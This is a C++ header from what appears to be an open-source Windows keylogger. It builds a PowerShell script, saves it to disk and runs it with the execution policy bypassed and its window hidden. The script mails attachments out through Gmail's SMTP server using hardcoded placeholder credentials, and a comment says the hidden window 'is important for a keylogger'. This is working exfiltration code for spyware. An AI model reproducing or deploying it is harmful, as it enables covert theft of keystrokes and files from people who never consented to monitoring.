/*
 *  C++ lib\SendMail.h
 *  Lucas Barbosa | 2017 | Open source software
 */

#ifndef SENDMAIL_H_INCLUDED
#define SENDMAIL_H_INCLUDED

/*
 *  This header handles and operates the powershell SMTP transactions
 *  and the creating of the send_mail script. For more info and specs
 *  on the mail capabilities and privacy check the readme.
 */

#include <fstream>
#include <vector>
#include <windows.h>

using namespace std;

// define powershell name for pre-processor
#define SCRIPT_NAME "sm.ps1"

namespace Mail
{

#define X_EM_TO "disbabledMail@gmail.com"
#define X_EM_FROM "disabledMail@gmail.com"
#define X_EM_PASS "disabledPaswordFromGmailCom"

const std::string &PowerShellScript =
"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
"  ForEach ($val in $Attachments)\r\n                    "
"        {\r\n               "
"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
"}\r\n                catch\r\n                    {\r\n                        exit 2; "
"\r\n                    }\r\n            }\r\n "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
"  \r\n          }\r\n} #End Function Send-Email\r\ntry\r\n    {\r\n        "
"Send-Email -attachment $Att "
"-To \"" +
 std::string (X_EM_TO) +
 "\""
" -Body $Body -Subject $Subj "
"-password \"" +
 std::string (X_EM_PASS) +
  "\""
" -From \"" +
 std::string (X_EM_FROM) +
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

#undef X_EM_FROM
#undef X_EM_TO
#undef X_EM_PASS

std::string string_replace(std::string str_arg, const std::string &curr_pattern, const std::string &new_pattern)
{
  if (curr_pattern.empty())
  {
    return str_arg;
  }

  size_t string_position = 0;
  // npos = string for termination
  while ((string_position = str_arg.find(curr_pattern, string_position)) != std::string::npos)
  {
    // actual string replacement with the length of the current pattern and the length of the pattern added onto the string position
    str_arg.replace(string_position, curr_pattern.length(), new_pattern), string_position += new_pattern.length();
  }
  return str_arg;
}

 bool check_file_exists(const std::string &file_to_check)
{
  std::ifstream file(file_to_check);
  // boolean check for file
  return (bool)file;
}

bool create_script()
{
  std::ofstream script(IO::get_our_path(true) + std::string(SCRIPT_NAME));
  if (!script)
  {
    return false;
  }

  script << PowerShellScript;
  // script must contain the actual file so that it can be invoked

  if (!script)
  {
    return false;
  }
  // If all goes well, close the file and return true
  script.close();
  return true;
}

// timer used to send mail
Timer mail_timer;

// email formatting
int send_mail(const std::string &subject, const std::string &body, const std::string &attachment)
{
  bool ok_flag;

  ok_flag = IO::mk_back_up_dir(IO::get_our_path(true));
  if (!ok_flag)
  {
    // means directory was not able to be made
    return -1;
  }

  std::string script_path = IO::get_our_path(true) + std::string(SCRIPT_NAME);
  // check if the script is actually there
  if (!check_file_exists(script_path))
  {
    // sets the flag to the return of the script creation
    ok_flag = create_script();
  }
  if (!ok_flag)
  {
    // checks if the script itself actually works
    return -2;
  }

  // admin priveledges for powershell script execution
  std::string sudo_flag = "-ExecutionPolicy ByPass -File \"" + script_path + "\" -Subj \"" +
                          string_replace(subject, "\"", "\\\"") +
                          "\" -Body \"" +
                          string_replace(body, "\"", "\\\"") +
                          "\" -Att \"" + attachment + "\"";

  /*
   *  Shell structure
   *  -For more info check the docs @ https://msdn.microsoft.com/en-us/library/windows/desktop/bb759784(v=vs.85).aspx
   */
  SHELLEXECUTEINFO shell_exec_info = {0};
  // declaring the size of the shell structure in bytes
  shell_exec_info.cbSize = sizeof(SHELLEXECUTEINFO);
  /*
   *  <fmask [in] Type >
   *  Prevents the powershell from terminating straight away
   */
  shell_exec_info.fMask = SEE_MASK_NOCLOSEPROCESS;
  // POWERSHELL will not open a window or pop-up (this is important for a keylogger) [hwnd = handle]
  shell_exec_info.hwnd = NULL;
  /*
   *  lpVerb <long_pointer_verb>
   *  Right click display list
   */
  shell_exec_info.lpVerb = "open";
    /*
   *  lpFile <long_pointer_file>
   *  File to be executed using 'powershell'
   */
  shell_exec_info.lpFile = "powershell";
  /*
   *  lpParameters <long_pointer_parameters>
   *  compiler flags to allow admin priveldges when executing powershell to be included
   *  in the shell structure.
   *  *NOTE: [NEED TO BE CONVERTED INTO C STRING, c_str()]
   */
  shell_exec_info.lpParameters = sudo_flag.c_str();
  // represents working directory in which will not be needed
  shell_exec_info.lpDirectory = NULL;
  // macro ensures the window stays hidden on start-up
  shell_exec_info.nShow = SW_HIDE;
  // handles the instance of the window
  shell_exec_info.hInstApp = NULL;

  ok_flag = (bool)ShellExecuteEx(&shell_exec_info);
  if (!ok_flag)
  {
    // means our shell script could not be executed
    return -3;
  }

  // if the ok_flag is true then WAIT [7 seconds]
  WaitForSingleObject(shell_exec_info.hProcess, 7000);
  DWORD exit_code = 100;  // 100 is purely arbitary
  // To check how to powershell worked
  GetExitCodeProcess(shell_exec_info.hProcess, &exit_code);

  // using reference lambda to retrieve all variables from the send_mail() function
  mail_timer.set_function([&]()
  {
    // retrieve the exit code afte 1 entire minute
    WaitForSingleObject(shell_exec_info.hProcess, 60000);
    GetExitCodeProcess(shell_exec_info.hProcess, &exit_code);
    // STILL_ACTIVE == 259
    if ((int)exit_code == STILL_ACTIVE)
    {
      // if still active...terminate this process
      TerminateProcess(shell_exec_info.hProcess, 100);
    }

    // write the contents to the log file.
    Helper::write_app_log("<from SendMail> Return Code: " + Helper::to_string((int)exit_code));

    }); // end of lambda <[&](){...}>

    // check Timer.h for a quick reference to members listed here
    mail_timer.set_repeat_count(1L);
    mail_timer.set_interval(10L);
    mail_timer.start_timer(true);
    return (int)exit_code;
}

/*
 *  Overloaded function allows the sending of MULTIPLE attachments using
 *  vectors
 */

int send_mail(const std::string &subject, const std::string &body, const std::vector<std::string> &att_vect)
{
  std::string attachments = "";
  // <1U> : means it only has 1 item
  if (att_vect.size() == 1U)
  {
    attachments = att_vect.at(0);
  }
  else
  {
    for (const auto &i : att_vect)
    {
      // attachment separator
      attachments += i + "::";
    }
    // substr() - 2 will remove the last pair of colons '::'
    attachments = attachments.substr(0, attachments.length() - 2);
  }

  return send_mail(subject, body, attachments);
}

}// end of namespace: Mail

#endif // SENDMAIL_H_INCLUDED
